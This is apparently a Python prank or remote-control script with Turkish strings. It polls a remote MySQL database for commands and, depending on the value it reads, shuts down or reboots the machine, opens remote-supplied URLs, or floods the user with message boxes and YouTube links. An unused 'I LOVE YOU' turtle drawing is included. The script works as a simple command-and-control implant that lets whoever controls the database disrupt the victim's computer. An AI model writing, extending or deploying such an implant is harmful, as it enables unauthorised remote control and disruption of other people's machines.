import os,time, datetime
from termcolor import colored
from datetime import *
from tkinter import messagebox
import mysql.connector
from termcolor import colored
from time import sleep
from os import system, name
from colorama import init, Fore, Back, Style
import socket,webbrowser
import time,smtplib
import time, turtle

os.system('cls' if os.name in ('nt', 'dos') else 'clear')

            
IP = socket.gethostbyname(socket.gethostname())
PC= socket.gethostname()

def kalp():
        turtle.bgcolor("black")
        turtle.pensize(2)


        def curve():
            for i in range(200):
                turtle.right(1)
                turtle.forward(1)

        turtle.speed(9999999999)
        turtle.color("red", "red")

        turtle.begin_fill()
        turtle.left(140)
        turtle.forward(111.65)
        curve()

        turtle.left(120)
        curve()
        turtle.forward(111.65)
        turtle.end_fill()
        turtle.hideturtle()

        turtle.color("white", "white")

        turtle.bgcolor("white")
        turtle.goto(-55,-250)
        turtle.color("black", "black")
        turtle.write("I LOVE YOU", font=("Verdana", 17,"bold"))

        turtle.exitonclick()


def MAİN():
    while True:
        cnx = mysql.connector.connect(user = 'root', password = 'DB PASSWORD', host='DB IP ADRESS', database='DB NAME')
        cursor = cnx.cursor() 
        query = ("SELECT askupdate, message FROM updater")
        cursor.execute(query)
        for (askupdate,message) in cursor:
            yanit = askupdate
            mesaj = message

            if yanit == "1" or yanit== "KAPAT":
                    os.system("shutdown -p")

            if yanit == "2" or yanit == "YENİDEN":
                    os.system("shutdown -r")

            if yanit == "3" or yanit == "İNFO":
                    messagebox.showinfo("M1000",mesaj)
                    time.sleep(1)
                    MAİN()

            if yanit == "4" or yanit == "LİNK GÖSTER" or yanit == "LİNK":
                    webbrowser.open(mesaj)
                    time.sleep(1)
                    MAİN()
            
            if yanit == "5" or yanit == "İDİOT":
                    webbrowser.open("https://www.youtube.com/watch?v=48rz8udZBmQ")
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    webbrowser.open("https://www.youtube.com/watch?v=hiRacdl02w4")
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000",mesaj)
                    messagebox.showinfo("M1000","Bu sadece bir şakaydı:D")
                    time.sleep(1)
                    MAİN()


            else:
                    time.sleep(1)
                    MAİN()

        time.sleep(1)


MAİN()






